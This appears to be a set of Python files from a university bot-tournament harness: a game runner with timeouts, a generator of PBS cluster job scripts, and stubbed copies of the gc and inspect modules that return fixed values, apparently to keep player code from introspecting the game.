    tmp = cardColorExchange( cont3colors ) + cardColorExchange( cont35a )
    tmp = { str(c):c for c in tmp }
    cardsLarge = [ tmp[key] for key in tmp ]
    random.shuffle(cardsLarge)

#    for i in range(len(cardsLarge)):
#        fn = "card-{:02d}.png".format(i)
#        UTILS.card2png(cardsLarge[i], fn )
#    quit()

    results = []

    user1name = _login1
    user2name = _login2
    global _PCOLORS
    _PCOLORS[user1name] = "#cae1e6"
    _PCOLORS[user2name] = "#fffda8"
    R = 33
    C = 33
    
    cardsRange = len(cardsLarge) // 2
    cards = copy.deepcopy( cardsLarge )
    d = getDefaultRes()
    cards = random.sample( cards, cardsRange )
    print("Num cards for game:", len(cards) )

    try:
        signalRaised = False
        signal.signal(signal.SIGALRM,handler)
        signal.alarm(int(2*TIMEOUT))
        time1 = time.perf_counter()
        p1 = SP1.Player(user1name, R,C, copy.deepcopy(cards))
        p1.tournament = True
        p1.timeout = TIMEOUT
    except TimeException:
        print("Error in constructor", user1name, " due to timeout")
        signal.alarm(0)
        time2 = time.perf_counter()
        d["ae"] = user1name
        d["pe"] = user2name
        d["reason"] = "timeout"
        text = "Error in {} constructor, it was killed due to timeout".format(user1name) + BR
        text += "Constructor took {:.3f}s, which is more than allowed timeout {:03f}s".format(time2-time1, TIMEOUT)
        d["html"] = html2page( text )
        saveDetails(d)
        quit()
    except:
        signal.alarm(0)
        print("Error in constructor", user1name)
        d["ae"] = user1name
        d["pe"] = user2name
        text = "Cannot initialize {} player".format(user1name) + BR
        text += BUTILS.pt(traceback.format_exc()) + BR
        d["html"] = html2page( text )
        d["reason"] = "__init__() fails"
        saveDetails(d)
        quit()

    try:
        signalRaised = False
        signal.signal(signal.SIGALRM,handler)
        signal.alarm(int(2*TIMEOUT))
        time1 = time.perf_counter()
        p2 = SP2.Player(user2name, R,C, copy.deepcopy(cards))
        p2.tournament = True
        p2.timeout = TIMEOUT
    except TimeException:
        print("Error in constructor", user2name, " due to timeout")
        signal.alarm(0)
        time2 = time.perf_counter()
        d["ae"] = user2name
        d["pe"] = user1name
        text = "Error in {} constructor, it was killed due to timeout".format(user2name) + BR
        text += "Constructor took {:.3f}s, which is more than allowed timeout {:03f}s".format(time2-time1, TIMEOUT)
        d["html"] = html2page( text )
        d["reason"] = "timeout"
        saveDetails(d)
        quit()
    except:
        signal.alarm(0)
        print("Error in constructor", user2name)
        d["ae"] = user2name
        d["pe"] = user1name
        text = "Cannot initialize {} player".format(user2name) + BR
        text += BUTILS.pt(traceback.format_exc()) + BR
        d["html"] = html2page( text )
        d["reason"] = "__init__() fails"
        saveDetails(d)
        quit()

    p1s = JP.Player("shadow1", R,C, copy.deepcopy(cards))
    p2s = JP.Player("shadow2", R,C, copy.deepcopy(cards))
    p1s._canvasid = 10000
    p2s._canvasid = 0

    p1.tournament = True
    p2.tournament = True
    p1s.tournament = True
    p2s.tournament = True
    p1.timeout = TIMEOUT
    p2.timeout = TIMEOUT
    p1s.timeout = TIMEOUT
    p2s.timeout = TIMEOUT
    res = gameOfTwo(p1,p2, p1s, p2s)
    print("Times are", res["times"] )

    res["html"] = res["html"].replace("{SCOREINFO}","")
    res["html"] = res["html"].replace("{GAMERESULT}","")
    d["reason"] = res["reason"]
    d["status"] = res["status"]
    d["runtimes"] = res["times"]
    d["score"] = res["score"]
    if res["status"] == False:
        d["ae"] = res["ae"]
        d["pe"] = res["pe"]
        res["html"] = res["html"].replace("{GAMERESULT}",BUTILS.toRed("Error in the game") )

    d["html"] = html2page( res["html"] ) 

    try:
        d["versions"][user1name] = str(p1.playerName)
    except:
        print("Cannot determine version of ", user1name)

    try:
        d["versions"][user2name] = str(p2.playerName)
    except:
        print("Cannot determine version of ", user2name)
    saveDetails(d)
    with open("{}.html".format(_mainPrefix), "wt") as f:
        f.write(d["html"])

    print("End of game, status:", d["status"], ", ae:", d["ae"], "pe:", d["pe"] )

game()

gc.py

def get_objects():
    return []

def get_referrers(*objs):
    return []
generate.py
#!/usr/bin/env python3

import sys, os, glob, re, hashlib, pickle, random

if len(sys.argv) < 2:
    print("usage", sys.argv[0], " <runAll 0/1> [missingGames.txt]")
    quit()

runAllPlayers = int( sys.argv[1] )
missingGamesFile = ""
if len(sys.argv) == 3:
    missingGamesFile = sys.argv[2]


srcDir = "src-processed"
runSrcDir = "runs-src"
runDir = "runs"
gameDir = "/storage/praha1/home/vonasek/alp/streky/"
homeDir = "/storage/praha1/home/vonasek"
            
expectedRuntimeDefault = 15  #lengs of ONE game in seconds
runTimePerJob = 12*60 #in seconds


playerFile = "player.py"

missingGames = []
if missingGamesFile != "":
    with open(missingGamesFile,"rt") as f:
        for line in f:
            missingGames.append( line.strip().split() )
print("Loaded", len(missingGames),"missing games records")

def loadPlayer(filename):
    res = ''
    if os.path.isfile(filename):
        try:
            f = open(filename,"rt")
            lines = f.readlines()
            res = ''.join(lines)
        except:
            pass
    return res            

def filemdsum(filename):
    if os.path.isfile(filename):
        return hashlib.md5(open(filename,"rb").read()).hexdigest()
    else:
        return hashlib.md5(b"none").hexdigest()


players = {}

for directory in glob.glob("{}/*".format(srcDir)):
    print("directory", directory)
    res = re.search("{}/(.*)".format(srcDir), directory)
    if res and len(res.groups()) > 0:
        playerName = res.groups()[0]
        if playerName in players:
            print("Error when parsing", directory, ": player name already in player!")
            quit()
        md5 = filemdsum("{}/player.py".format(directory))
        players[ playerName ] = [ directory, md5 ]

#check m5dsum of already played games
md5sums = {}
if os.path.isfile("md5sums.p"):
    md5sums = pickle.load( open("md5sums.p", "rb" ) )

print("Loaded MD5", md5sums)

runtimes = {}
if os.path.isfile("runtimes.p"):
    runtimes = pickle.load( open("runtimes.p", "rb") )
print("Loaded", len(runtimes), "runtimes values")

computeGames = { name: { name2: None for name2 in players if name2 != name } for name in players }

       

changeInPlayer = {}

for name1 in players:
    changeInPlayer[ name1 ] = False
    dirname, md5new = players[ name1 ]

    print("Codes", name1, ": new=", md5new, ", old=", md5sums[name1] if name1 in md5sums else "unknown", end=" | ")
    
    if (name1 in md5sums) and (md5new in md5sums[name1]) and (len(md5sums[name1]) == 1):
        print("SAME")
    else:
        print("DIFFERENT")
        changeInPlayer[name1] = True
    if runAllPlayers == 1:
            changeInPlayer[ name1 ] = True

    for name2 in players:
        if name2 == name1:
            continue
        outdir = "{}/{}/{}-{}".format(runDir, name1, name1, name2)
        os.system("mkdir -p {}".format(outdir))
        outfile = "{}/allGames.p".format(outdir)
        if not os.path.isfile(outfile):
            computeGames[name1][name2] = outdir #outdir ia not used anymore
            computeGames[name1][name2] = True 

for item in missingGames:
    name1, name2, value = item
    if name1 in computeGames and name2 in computeGames:
        computeGames[name1][name2] = True
        print("Recomputing", name1, "vs", name2, " according to missing games")
    else:
        print("Got information about missing game", name1, "vs", name2, " but these records are not amongst current users!! ")
        print("!!!!!!!")
 


os.system("tar czhf streky-all.tar.gz *.py src-processed")

cmds = []

for name1 in players:
    for name2 in players:
        if name1 == name2:
            continue
        if computeGames[name1][name2] != None or changeInPlayer[name1] or changeInPlayer[name2]:
                
            cmd = " ### game {} vs {}, reason: missing game {}, change in {}={}, change in {}={}\n".format(name1, name2, computeGames[name1][name2],name1, changeInPlayer[name1], name2, changeInPlayer[name2])
            cmd += "cd $SCRATCHDIR\n"
            cmd += "mkdir {}-{}\n".format(name1, name2)
            cmd += "cd {}-{}\n".format(name1, name2)
            cmd += "cp -r ../src-processed/{} s123a\n".format(name1)
            cmd += "cp -r ../src-processed/{} s123b\n\n".format(name2)
            cmd += "touch s123a/__init__.py\n"
            cmd += "touch s123b/__init__.py\n"
            for trial in range(10):
                cmd += "rm -rf __pycache__ s123a/__pycache__ s123b/__pycache__\n"
                cmd += "cp ../*.py . \n"
                cmd += "cp ../inspect.py ../gc.py s123a\n"
                cmd += "cp ../inspect.py ../gc.py s123b\n"
                cmd += "python3 -B game.py out.{} {} {} {} doremove\n\n".format(trial, trial, name1, name2)

            cmd += "python3 ../pickleAll.py\n"
            cmd += "rm {}/{}/{}/{}-{}/allGames.p\n".format(gameDir,runDir,name1, name1, name2)
            cmd += "cp -f allGames.p {}/{}/{}/{}-{}/\n".format(gameDir, runDir, name1, name1, name2)
            cmd += "cd $SCRATCHDIR\n"
            cmd += "rm -rf {}-{}\n".format(name1, name2)

            estimatedRuntime = -1
            if name1 in runtimes and name2 in runtimes[name1]:
                vals = runtimes[name1][name2] + [-1]
                estimatedRuntime = max( estimatedRuntime, max(vals) )
            if name2 in runtimes and name1 in runtimes[name2]:
                vals = runtimes[name2][name1] + [-1]
                estimatedRuntime = max( estimatedRuntime , max(vals) )
#            print("A",name1, name2, "time", estimatedRuntime, expectedRuntimeDefault)

            if estimatedRuntime < 0:
                estimatedRuntime = expectedRuntimeDefault
            estimatedRuntime *= 10
#            print("B",name1, name2, "time", estimatedRuntime)

            cmds.append( [ cmd, name1, name2, estimatedRuntime ] )



print("Generated", len(cmds), "commands")


pbsPrefix="""#!/bin/bash
#PBS -l select=1:ncpus=1:mem=1400mb:scratch_local=1gb
#PBS -l walltime=01:59:00
#PBS -N {jobName}

un=`uname -a`
module add python36-modules/gcc
trap 'clean_scratch' TERM EXIT
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:{homeDir}/opt/lib
export PATH={homeDir}/opt/bin:$PATH
cd $SCRATCHDIR
export PYTHONIOENCODING='utf-8'

echo copying .tar.gz
date
cp {gameDir}/streky-all.tar.gz . 
tar xfz streky-all.tar.gz 
echo \"end of copying .tar.gz\"
date
"""


isJobAssigned = [ False for _ in range(len(cmds)) ]

batches = []
while False in isJobAssigned:
    
    sumTime = 0
    trials = len(isJobAssigned) // 2
    trial = 0
    batch = []
    while sumTime < runTimePerJob and trial < trials:
        trial += 1
        isfreejobsidx = [ i for i in range(len(isJobAssigned)) if isJobAssigned[i] == False ]
        r = random.sample(isfreejobsidx,1)[0]
        
        lastround = False
        if len([ 1 for i in isJobAssigned if i == False ]) < len(isJobAssigned) / 20:
            lastround = True

        if sumTime + cmds[r][3] < runTimePerJob or lastround:
            batch.append(r)
            isJobAssigned[r] = True
            sumTime += cmds[r][3]
        if lastround:
            break
    if len(batch) > 0:
        batches.append([batch, sumTime])
        print("Generated", len(batches), ", remaininmg", len([ 1 for i in isJobAssigned if i == False ] ), ", last batch has", len(batches[-1][0]), " games     ", end="\r")


print("Created", len(batches), "batches from total", len(cmds), "commands, estimated total runtime is ", sum([item[1] for item in batches]), "s")
if False in isJobAssigned:
    print("Error, some jobs are not assigned!")
    quit()

"""
for ci in range(len(cmds)):
    cmdString, name1, name2,estimatedRuntime = cmds[ci]
    f = open("cmd.{}.sh".format(ci), "wt")
    f.write(pbsPrefix.format(jobName="trx-"+str(ci), gameDir = gameDir, homeDir = homeDir ) )
    f.write("#Expected runtime {}s\n".format(estimatedRuntime))
    f.write("\n#cmds:\n\n")
    f.write(cmdString)
    f.close()
"""

print("Generating cmd files")
for batchi in range(len(batches)):
    jobsidx, runtime = batches[batchi]
#    print("Generating", batchi, " estimated runtime", runtime)
    f = open("cmd.{}.sh".format(batchi), "wt")

    f.write(pbsPrefix.format(jobName="trx-"+str(cmds[jobsidx[0]][1]) + ":"+ str(cmds[jobsidx[0]][2]), gameDir = gameDir, homeDir = homeDir ) )
    f.write("#Expected runtime of whole batch {}s, num batches={}\n".format(runtime, len(jobsidx)))
    for ji in jobsidx:
        cmdString, name1, name2, estimatedRuntime = cmds[ji]
        f.write("#Command {}/{}, estimated runtime={}s\n".format(ji,len(cmds),estimatedRuntime))
        f.write(cmdString)
        f.write("#end of command {}/{}\n\n".format(ji, len(cmds)))
    f.close()
print("End of generate")

getr.py
#!/usr/bin/env python3

import random

a = [ 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293 ]
print( a[ random.randint(0, len(a)-1) ] )
inspect.py
"""Get useful information from live Python objects.

This module encapsulates the interface provided by the internal special
attributes (co_*, im_*, tb_*, etc.) in a friendlier fashion.
It also provides some help for examining source code and class layout.

Here are some of the useful functions provided by this module:

    ismodule(), isclass(), ismethod(), isfunction(), isgeneratorfunction(),
        isgenerator(), istraceback(), isframe(), iscode(), isbuiltin(),
        isroutine() - check object types
    getmembers() - get members of an object that satisfy a given condition

    getfile(), getsourcefile(), getsource() - find an object's source code
    getdoc(), getcomments() - get documentation on an object
    getmodule() - determine the module that an object came from
    getclasstree() - arrange classes so as to represent their hierarchy

    getargvalues(), getcallargs() - get info about function arguments
    getfullargspec() - same, with support for Python 3 features
    formatargspec(), formatargvalues() - format an argument spec
    getouterframes(), getinnerframes() - get info about frames
    currentframe() - get the current stack frame
    stack(), trace() - get info about frames on the stack or in a traceback

    signature() - get a Signature object for the callable
"""

# This module is in the public domain.  No warranties.

__author__ = ('Ka-Ping Yee <ping@lfw.org>',
              'Yury Selivanov <yselivanov@sprymix.com>')

import abc
import ast
import dis
import collections.abc
import enum
import importlib.machinery
import itertools
import linecache
import os
import re
import sys
import tokenize
import token
import types
import warnings
import functools
import builtins
from operator import attrgetter
from collections import namedtuple, OrderedDict

# Create constants for the compiler flags in Include/code.h
# We try to get them from dis to avoid duplication
mod_dict = globals()
for k, v in dis.COMPILER_FLAG_NAMES.items():
    mod_dict["CO_" + v] = k

# See Include/object.h
TPFLAGS_IS_ABSTRACT = 1 << 20

# ----------------------------------------------------------- type-checking
def ismodule(object):
    return True
    """Return true if the object is a module.

    Module objects provide these attributes:
        __cached__      pathname to byte compiled file
        __doc__         documentation string
        __file__        filename (missing for built-in modules)"""
    return isinstance(object, types.ModuleType)

def isclass(object):
    return True
    """Return true if the object is a class.

    Class objects provide these attributes:
        __doc__         documentation string
        __module__      name of module in which this class was defined"""
    return isinstance(object, type)

def ismethod(object):
    """Return true if the object is an instance method.

    Instance method objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this method was defined
        __func__        function object containing implementation of method
        __self__        instance to which this method is bound"""
    return isinstance(object, types.MethodType)

def ismethoddescriptor(object):
    """Return true if the object is a method descriptor.

    But not if ismethod() or isclass() or isfunction() are true.

    This is new in Python 2.2, and, for example, is true of int.__add__.
    An object passing this test has a __get__ attribute but not a __set__
    attribute, but beyond that the set of attributes varies.  __name__ is
    usually sensible, and __doc__ often is.

    Methods implemented via descriptors that also pass one of the other
    tests return false from the ismethoddescriptor() test, simply because
    the other tests promise more -- you can, e.g., count on having the
    __func__ attribute (etc) when an object passes ismethod()."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__get__") and not hasattr(tp, "__set__")

def isdatadescriptor(object):
    """Return true if the object is a data descriptor.

    Data descriptors have both a __get__ and a __set__ attribute.  Examples are
    properties (defined in Python) and getsets and members (defined in C).
    Typically, data descriptors will also have __name__ and __doc__ attributes
    (properties, getsets, and members have both of these attributes), but this
    is not guaranteed."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__set__") and hasattr(tp, "__get__")

if hasattr(types, 'MemberDescriptorType'):
    # CPython and equivalent
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.MemberDescriptorType)
else:
    # Other implementations
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return False

if hasattr(types, 'GetSetDescriptorType'):
    # CPython and equivalent
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.GetSetDescriptorType)
else:
    # Other implementations
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return False

def isfunction(object):
    return False
    """Return true if the object is a user-defined function.

    Function objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this function was defined
        __code__        code object containing compiled function bytecode
        __defaults__    tuple of any default values for arguments
        __globals__     global namespace in which this function was defined
        __annotations__ dict of parameter annotations
        __kwdefaults__  dict of keyword only parameters with defaults"""
    return isinstance(object, types.FunctionType)

def isgeneratorfunction(object):
    return True
    """Return true if the object is a user-defined generator function.

    Generator function objects provide the same attributes as functions.
    See help(isfunction) for a list of attributes."""
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_GENERATOR)

def iscoroutinefunction(object):
    return False
    """Return true if the object is a coroutine function.

    Coroutine functions are defined with "async def" syntax.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_COROUTINE)

def isasyncgenfunction(object):
    return False
    """Return true if the object is an asynchronous generator function.

    Asynchronous generator functions are defined with "async def"
    syntax and have "yield" expressions in their body.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_ASYNC_GENERATOR)

def isasyncgen(object):
    return False
    """Return true if the object is an asynchronous generator."""
    return isinstance(object, types.AsyncGeneratorType)

def isgenerator(object):
    return False
    """Return true if the object is a generator.

    Generator objects provide these attributes:
        __iter__        defined to support iteration over container
        close           raises a new GeneratorExit exception inside the
                        generator to terminate the iteration
        gi_code         code object
        gi_frame        frame object or possibly None once the generator has
                        been exhausted
        gi_running      set to 1 when generator is executing, 0 otherwise
        next            return the next item from the container
        send            resumes the generator and "sends" a value that becomes
                        the result of the current yield-expression
        throw           used to raise an exception inside the generator"""
    return isinstance(object, types.GeneratorType)

def iscoroutine(object):
    return True
    """Return true if the object is a coroutine."""
    return isinstance(object, types.CoroutineType)

def isawaitable(object):
    return False
    """Return true if object can be passed to an ``await`` expression."""
    return (isinstance(object, types.CoroutineType) or
            isinstance(object, types.GeneratorType) and
                bool(object.gi_code.co_flags & CO_ITERABLE_COROUTINE) or
            isinstance(object, collections.abc.Awaitable))

def istraceback(object):
    return False
    """Return true if the object is a traceback.

    Traceback objects provide these attributes:
        tb_frame        frame object at this level
        tb_lasti        index of last attempted instruction in bytecode
        tb_lineno       current line number in Python source code
        tb_next         next inner traceback object (called by this level)"""
    return isinstance(object, types.TracebackType)

def isframe(object):
    """Return true if the object is a frame object.

    Frame objects provide these attributes:
        f_back          next outer frame object (this frame's caller)
        f_builtins      built-in namespace seen by this frame
        f_code          code object being executed in this frame
        f_globals       global namespace seen by this frame
        f_lasti         index of last attempted instruction in bytecode
        f_lineno        current line number in Python source code
        f_locals        local namespace seen by this frame
        f_trace         tracing function for this frame, or None"""
    return isinstance(object, types.FrameType)

def iscode(object):
    return False
    """Return true if the object is a code object.

    Code objects provide these attributes:
        co_argcount         number of arguments (not including *, ** args
                            or keyword only arguments)
        co_code             string of raw compiled bytecode
        co_cellvars         tuple of names of cell variables
        co_consts           tuple of constants used in the bytecode
        co_filename         name of file in which this code object was created
        co_firstlineno      number of first line in Python source code
        co_flags            bitmap: 1=optimized | 2=newlocals | 4=*arg | 8=**arg
                            | 16=nested | 32=generator | 64=nofree | 128=coroutine
                            | 256=iterable_coroutine | 512=async_generator
        co_freevars         tuple of names of free variables
        co_kwonlyargcount   number of keyword only arguments (not including ** arg)
        co_lnotab           encoded mapping of line numbers to bytecode indices
        co_name             name with which this code object was defined
        co_names            tuple of names of local variables
        co_nlocals          number of local variables
        co_stacksize        virtual machine stack space required
        co_varnames         tuple of names of arguments and local variables"""
    return isinstance(object, types.CodeType)

def isbuiltin(object):
    return False
    """Return true if the object is a built-in function or method.

    Built-in functions and methods provide these attributes:
        __doc__         documentation string
        __name__        original name of this function or method
        __self__        instance to which a method is bound, or None"""
    return isinstance(object, types.BuiltinFunctionType)

def isroutine(object):
    return True
    """Return true if the object is any kind of function or method."""
    return (isbuiltin(object)
            or isfunction(object)
            or ismethod(object)
            or ismethoddescriptor(object))

def isabstract(object):
    return False
    """Return true if the object is an abstract base class (ABC)."""
    if not isinstance(object, type):
        return False
    if object.__flags__ & TPFLAGS_IS_ABSTRACT:
        return True
    if not issubclass(type(object), abc.ABCMeta):
        return False
    if hasattr(object, '__abstractmethods__'):
        # It looks like ABCMeta.__new__ has finished running;
        # TPFLAGS_IS_ABSTRACT should have been accurate.
        return False
    # It looks like ABCMeta.__new__ has not finished running yet; we're
    # probably in __init_subclass__. We'll look for abstractmethods manually.
    for name, value in object.__dict__.items():
        if getattr(value, "__isabstractmethod__", False):
            return True
    for base in object.__bases__:
        for name in getattr(base, "__abstractmethods__", ()):
            value = getattr(object, name, None)
            if getattr(value, "__isabstractmethod__", False):
                return True
    return False

def getmembers(object, predicate=None):
    return []
    """Return all members of an object as (name, value) pairs sorted by name.
    Optionally, only return members that satisfy a given predicate."""
    if isclass(object):
        mro = (object,) + getmro(object)
    else:
        mro = ()
    results = []
    processed = set()
    names = dir(object)
    # :dd any DynamicClassAttributes to the list of names if object is a class;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists
    try:
        for base in object.__bases__:
            for k, v in base.__dict__.items():
                if isinstance(v, types.DynamicClassAttribute):
                    names.append(k)
    except AttributeError:
        pass
    for key in names:
        # First try to get the value via getattr.  Some descriptors don't
        # like calling their __get__ (see bug #1785), so fall back to
        # looking in the __dict__.
        try:
            value = getattr(object, key)
            # handle the duplicate key
            if key in processed:
                raise AttributeError
        except AttributeError:
            for base in mro:
                if key in base.__dict__:
                    value = base.__dict__[key]
                    break
            else:
                # could be a (currently) missing slot member, or a buggy
                # __dir__; discard and move on
                continue
        if not predicate or predicate(value):
            results.append((key, value))
        processed.add(key)
    results.sort(key=lambda pair: pair[0])
    return results

Attribute = namedtuple('Attribute', 'name kind defining_class object')

def classify_class_attrs(cls):
    """Return list of attribute-descriptor tuples.

    For each name in dir(cls), the return list contains a 4-tuple
    with these elements:

        0. The name (a string).

        1. The kind of attribute this is, one of these strings:
               'class method'    created via classmethod()
               'static method'   created via staticmethod()
               'property'        created via property()
               'method'          any other flavor of method or descriptor
               'data'            not a method

        2. The class which defined this attribute (a class).

        3. The object as obtained by calling getattr; if this fails, or if the
           resulting object does not live anywhere in the class' mro (including
           metaclasses) then the object is looked up in the defining class's
           dict (found by walking the mro).

    If one of the items in dir(cls) is stored in the metaclass it will now
    be discovered and not have None be listed as the class in which it was
    defined.  Any items whose home class cannot be discovered are skipped.
    """

    mro = getmro(cls)
    metamro = getmro(type(cls)) # for attributes stored in the metaclass
    metamro = tuple([cls for cls in metamro if cls not in (type, object)])
    class_bases = (cls,) + mro
    all_bases = class_bases + metamro
    names = dir(cls)
    # :dd any DynamicClassAttributes to the list of names;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists.
    for base in mro:
        for k, v in base.__dict__.items():
            if isinstance(v, types.DynamicClassAttribute):
                names.append(k)
    result = []
    processed = set()

    for name in names:
        # Get the object associated with the name, and where it was defined.
        # Normal objects will be looked up with both getattr and directly in
        # its class' dict (in case getattr fails [bug #1785], and also to look
        # for a docstring).
        # For DynamicClassAttributes on the second pass we only look in the
        # class's dict.
        #
        # Getting an obj from the __dict__ sometimes reveals more than
        # using getattr.  Static and class methods are dramatic examples.
        homecls = None
        get_obj = None
        dict_obj = None
        if name not in processed:
            try:
                if name == '__dict__':
                    raise Exception("__dict__ is special, don't want the proxy")
                get_obj = getattr(cls, name)
            except Exception as exc:
                pass
            else:
                homecls = getattr(get_obj, "__objclass__", homecls)
                if homecls not in class_bases:
                    # if the resulting object does not live somewhere in the
                    # mro, drop it and search the mro manually
                    homecls = None
                    last_cls = None
                    # first look in the classes
                    for srch_cls in class_bases:
                        srch_obj = getattr(srch_cls, name, None)
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    # then check the metaclasses
                    for srch_cls in metamro:
                        try:
                            srch_obj = srch_cls.__getattr__(cls, name)
                        except AttributeError:
                            continue
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    if last_cls is not None:
                        homecls = last_cls
        for base in all_bases:
            if name in base.__dict__:
                dict_obj = base.__dict__[name]
                if homecls not in metamro:
                    homecls = base
                break
        if homecls is None:
            # unable to locate the attribute anywhere, most likely due to
            # buggy custom __dir__; discard and move on
            continue
        obj = get_obj if get_obj is not None else dict_obj
        # Classify the object or its descriptor.
        if isinstance(dict_obj, staticmethod):
            kind = "static method"
            obj = dict_obj
        elif isinstance(dict_obj, classmethod):
            kind = "class method"
            obj = dict_obj
        elif isinstance(dict_obj, property):
            kind = "property"
            obj = dict_obj
        elif isroutine(obj):
            kind = "method"
        else:
            kind = "data"
        result.append(Attribute(name, kind, homecls, obj))
        processed.add(name)
    return result

# ----------------------------------------------------------- class helpers

def getmro(cls):
    "Return tuple of base classes (including cls) in method resolution order."
    return cls.__mro__

# -------------------------------------------------------- function helpers

def unwrap(func, *, stop=None):
    """Get the object wrapped by *func*.

   Follows the chain of :attr:`__wrapped__` attributes returning the last
   object in the chain.

   *stop* is an optional callback accepting an object in the wrapper chain
   as its sole argument that allows the unwrapping to be terminated early if
   the callback returns a true value. If the callback never returns a true
   value, the last object in the chain is returned as usual. For example,
   :func:`signature` uses this to stop unwrapping if any object in the
   chain has a ``__signature__`` attribute defined.

   :exc:`ValueError` is raised if a cycle is encountered.

    """
    if stop is None:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__')
    else:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__') and not stop(f)
    f = func  # remember the original func for error reporting
    # Memoise by id to tolerate non-hashable objects, but store objects to
    # ensure they aren't destroyed, which would allow their IDs to be reused.
    memo = {id(f): f}
    recursion_limit = sys.getrecursionlimit()
    while _is_wrapper(func):
        func = func.__wrapped__
        id_func = id(func)
        if (id_func in memo) or (len(memo) >= recursion_limit):
            raise ValueError('wrapper loop when unwrapping {!r}'.format(f))
        memo[id_func] = func
    return func

# -------------------------------------------------- source code extraction
def indentsize(line):
    """Return the indent size, in spaces, at the start of a line of text."""
    expline = line.expandtabs()
    return len(expline) - len(expline.lstrip())

def _findclass(func):
    cls = sys.modules.get(func.__module__)
    if cls is None:
        return None
    for name in func.__qualname__.split('.')[:-1]:
        cls = getattr(cls, name)
    if not isclass(cls):
        return None
    return cls

def _finddoc(obj):
    if isclass(obj):
        for base in obj.__mro__:
            if base is not object:
                try:
                    doc = base.__doc__
                except AttributeError:
                    continue
                if doc is not None:
                    return doc
        return None

    if ismethod(obj):
        name = obj.__func__.__name__
        self = obj.__self__
        if (isclass(self) and
            getattr(getattr(self, name, None), '__func__') is obj.__func__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    elif isfunction(obj):
        name = obj.__name__
        cls = _findclass(obj)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif isbuiltin(obj):
        name = obj.__name__
        self = obj.__self__
        if (isclass(self) and
            self.__qualname__ + '.' + name == obj.__qualname__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    # Should be tested before isdatadescriptor().
    elif isinstance(obj, property):
        func = obj.fget
        name = func.__name__
        cls = _findclass(func)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif ismethoddescriptor(obj) or isdatadescriptor(obj):
        name = obj.__name__
        cls = obj.__objclass__
        if getattr(cls, name) is not obj:
            return None
    else:
        return None

    for base in cls.__mro__:
        try:
            doc = getattr(base, name).__doc__
        except AttributeError:
            continue
        if doc is not None:
            return doc
    return None

def getdoc(object):
    return None
    """Get the documentation string for an object.

    All tabs are expanded to spaces.  To clean up docstrings that are
    indented to line up with blocks of code, any whitespace than can be
    uniformly removed from the second line onwards is removed."""
    try:
        doc = object.__doc__
    except AttributeError:
        return None
    if doc is None:
        try:
            doc = _finddoc(object)
        except (AttributeError, TypeError):
            return None
    if not isinstance(doc, str):
        return None
    return cleandoc(doc)

def cleandoc(doc):
    return None
    """Clean up indentation from docstrings.

    Any whitespace that can be uniformly removed from the second line
    onwards is removed."""
    try:
        lines = doc.expandtabs().split('\n')
    except UnicodeError:
        return None
    else:
        # Find minimum indentation of any non-blank lines after first line.
        margin = sys.maxsize
        for line in lines[1:]:
            content = len(line.lstrip())
            if content:
                indent = len(line) - content
                margin = min(margin, indent)
        # Remove indentation.
        if lines:
            lines[0] = lines[0].lstrip()
        if margin < sys.maxsize:
            for i in range(1, len(lines)): lines[i] = lines[i][margin:]
        # Remove any trailing or leading blank lines.
        while lines and not lines[-1]:
            lines.pop()
        while lines and not lines[0]:
            lines.pop(0)
        return '\n'.join(lines)

def getfile(object):
    return "brute.py"
    """Work out which source or compiled file an object was defined in."""
    if ismodule(object):
        if hasattr(object, '__file__'):
            return object.__file__
        raise TypeError('{!r} is a built-in module'.format(object))
    if isclass(object):
        if hasattr(object, '__module__'):
            object = sys.modules.get(object.__module__)
            if hasattr(object, '__file__'):
                return object.__file__
        raise TypeError('{!r} is a built-in class'.format(object))
    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        return object.co_filename
    raise TypeError('{!r} is not a module, class, method, '
                    'function, traceback, frame, or code object'.format(object))

def getmodulename(path):
    return "brute.py"
    """Return the module name for a given file, or None."""
    fname = os.path.basename(path)
    # Check for paths that look like an actual module file
    suffixes = [(-len(suffix), suffix)
                    for suffix in importlib.machinery.all_suffixes()]
    suffixes.sort() # try longest suffixes first, in case they overlap
    for neglen, suffix in suffixes:
        if fname.endswith(suffix):
            return fname[:neglen]
    return None

def getsourcefile(object):
    return "brute.py"
    """Return the filename that can be used to locate an object's source.
    Return None if no way can be identified to get the source.
    """
    filename = getfile(object)
    all_bytecode_suffixes = importlib.machinery.DEBUG_BYTECODE_SUFFIXES[:]
    all_bytecode_suffixes += importlib.machinery.OPTIMIZED_BYTECODE_SUFFIXES[:]
    if any(filename.endswith(s) for s in all_bytecode_suffixes):
        filename = (os.path.splitext(filename)[0] +
                    importlib.machinery.SOURCE_SUFFIXES[0])
